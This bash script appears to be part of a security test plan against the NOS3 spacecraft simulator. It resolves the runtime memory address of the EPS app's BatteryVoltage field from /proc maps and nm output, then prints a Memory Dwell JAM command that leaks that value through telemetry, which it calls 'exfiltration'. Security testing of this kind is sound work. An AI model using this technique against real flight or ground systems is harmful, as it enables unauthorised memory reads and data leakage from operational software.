#!/usr/bin/env bash
# resolve_eps_address.sh — Phase 3 / Scenario 2 Phase B helper
#
# Resolves the runtime virtual address of GENERIC_EPS_AppData inside the
# running cFS process so it can be used with MD JAM commands for EPS voltage
# exfiltration (Scenario 2, Alternative Pivot 1).
#
# HOW TO USE:
#   Run this script INSIDE the nos3 build container:
#     cd nos3
#     make debug          # opens a shell inside the ivvitc/nos3-64 container
#     ./scripts/attack/resolve_eps_address.sh
#
# The output is the virtual address to pass as ResolvedAddress in a JAM command:
#   MD JAM: Table N, Entry 0, ResolvedAddress = <output>, Length = 2, Delay = 1
#   MD START_DWELL on Table N → MD dwell packets will contain EPS BatteryVoltage
#
# BatteryVoltage offset within GENERIC_EPS_AppData:
#   GENERIC_EPS_AppData.HkTelemetryPkt.DeviceHK.BatteryVoltage
#   Struct chain: generic_eps_app.h → generic_eps_msg.h → generic_eps_device.h:30-44
#   Static offset estimate: +0x24 from GENERIC_EPS_AppData base
#   Verify at runtime: pahole -C GENERIC_EPS_AppData_t /cf/generic_eps.so
#
# References:
#   test_plans.md Scenario 2 Phase B
#   phase3_telemetry_validation_weaknesses.md Section 3

set -euo pipefail

EPS_SO="/cf/generic_eps.so"
CFS_PROC="core-cpu1"

echo "=== Phase 3 / Scenario 2: EPS Address Resolution ==="
echo ""

# 1. Find cFS PID
CFS_PID=$(pgrep -f "$CFS_PROC" 2>/dev/null | head -1 || true)
if [[ -z "$CFS_PID" ]]; then
    echo "[ERROR] ${CFS_PROC} process not found. Is NOS3 running? (make launch)"
    exit 1
fi
echo "[*] cFS PID: ${CFS_PID}"

# 2. Get static symbol offset from the .so
if [[ ! -f "$EPS_SO" ]]; then
    echo "[ERROR] ${EPS_SO} not found. Check build output path."
    exit 1
fi

echo "[*] Searching for GENERIC_EPS_AppData in ${EPS_SO}..."
NM_LINE=$(nm -D "$EPS_SO" 2>/dev/null | grep "GENERIC_EPS_AppData" | head -1 || true)
if [[ -z "$NM_LINE" ]]; then
    echo "[WARN] Symbol not found in dynamic table. Trying nm without -D..."
    NM_LINE=$(nm "$EPS_SO" 2>/dev/null | grep "GENERIC_EPS_AppData" | head -1 || true)
fi

if [[ -z "$NM_LINE" ]]; then
    echo "[ERROR] GENERIC_EPS_AppData symbol not found in ${EPS_SO}."
    echo "        Check that EPS app is compiled with debug symbols."
    exit 1
fi

SYMBOL_OFFSET=$(echo "$NM_LINE" | awk '{print $1}')
echo "[*] Static offset in .so: 0x${SYMBOL_OFFSET}"

# 3. Get .so load base from /proc/maps
MAPS_LINE=$(grep "generic_eps" "/proc/${CFS_PID}/maps" 2>/dev/null | \
    awk '/r-xp|r--p/{print $1; exit}' || true)
if [[ -z "$MAPS_LINE" ]]; then
    echo "[ERROR] generic_eps not found in /proc/${CFS_PID}/maps."
    echo "        EPS .so may not be loaded yet. Wait for cFS startup to complete."
    exit 1
fi

LOAD_BASE_HEX=$(echo "$MAPS_LINE" | cut -d'-' -f1)
echo "[*] .so load base (maps): 0x${LOAD_BASE_HEX}"

# 4. Compute virtual address = load_base + symbol_offset
LOAD_BASE_DEC=$(( 16#${LOAD_BASE_HEX} ))
SYMBOL_DEC=$(( 16#${SYMBOL_OFFSET} ))
VA_DEC=$(( LOAD_BASE_DEC + SYMBOL_DEC ))
VA_HEX=$(printf "%016x" "$VA_DEC")
BATTERY_VA_HEX=$(printf "%016x" $(( VA_DEC + 0x24 )))

echo ""
echo "=== RESULTS ==="
echo "  GENERIC_EPS_AppData VA:          0x${VA_HEX}"
echo "  BatteryVoltage VA (+0x24 est):   0x${BATTERY_VA_HEX}"
echo ""
echo "=== MD JAM COMMAND ==="
echo "  Use COSMOS or ground system to send:"
echo "    MD_JAM_DWELL: TableId=2, EntryId=1"
echo "      FieldAddress = 0x${BATTERY_VA_HEX}  (BatteryVoltage)"
echo "      FieldLength  = 2                     (uint16_t)"
echo "      FieldDelay   = 1"
echo "    MD_START_DWELL: TableId=2"
echo ""
echo "  After ~4s, MD Dwell Table 2 packets will contain EPS BatteryVoltage."
echo "  Verify in Kibana: MD dwell data bytes match EPS HK BatteryVoltage."
echo ""
echo "[!] NOTE: 0x24 is a static analysis estimate. Verify with:"
echo "      pahole -C GENERIC_EPS_AppData_t ${EPS_SO} | grep -A5 BatteryVoltage"
